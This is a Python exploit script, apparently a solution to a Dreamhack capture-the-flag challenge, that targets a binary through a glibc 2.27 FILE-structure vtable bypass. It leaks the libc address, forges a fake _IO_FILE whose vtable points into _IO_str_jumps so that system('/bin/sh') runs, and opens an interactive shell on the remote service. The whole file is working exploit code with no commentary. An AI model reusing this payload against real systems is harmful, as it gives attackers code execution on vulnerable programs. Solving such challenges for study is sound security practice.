#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./bypass_valid_vtable_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.27.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 13535)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.recvuntil(b"stdout: ")
    libc.base = int(io.recvline().strip(b"\n"), 16) - unwrap(
        libc.symbol("_IO_2_1_stdout_")
    )

    io_str_jump = unwrap(libc.symbol("_IO_str_jumps"))
    io_file_jump = unwrap(libc.symbol("_IO_file_jumps"))

    io_str_overflow = io_str_jump + 24
    fake_vtable = io_str_overflow - 16
    binsh = next(libc.find("/bin/sh\0"))
    system = unwrap(libc.symbol("system"))
    fp = unwrap(exe.symbol("fp"))

    ptr.logger.info(f"io_str_jump: {hex(io_str_jump)}")
    ptr.logger.info(f"io_str_overflow: {hex(io_str_overflow)}")
    ptr.logger.info(f"fake_vtable: {hex(fake_vtable)}")

    payload = b""
    payload += ptr.p64(0)  # flags
    payload += ptr.p64(0)  # read_ptr
    payload += ptr.p64(0)  # read_end
    payload += ptr.p64(0)  # read_base
    payload += ptr.p64(0)  # write_base
    payload += ptr.p64((binsh - 100) // 2)  # write_ptr
    payload += ptr.p64(0)  # write_end
    payload += ptr.p64(0)  # buf_base
    payload += ptr.p64((binsh - 100) // 2)  # buf_end
    payload += ptr.p64(0)  # save_base
    payload += ptr.p64(0)  # backup_base
    payload += ptr.p64(0)  # save_end
    payload += ptr.p64(0)  # marker
    payload += ptr.p64(0)  # chain
    payload += ptr.p64(0)  # fileno
    payload += ptr.p64(0)  # old_offset
    payload += ptr.p64(0)
    payload += ptr.p64(fp + 0x80)
    payload = payload.ljust(216, ptr.p8(0))
    payload += ptr.p64(fake_vtable)
    payload += ptr.p64(system)

    io.sendline(payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
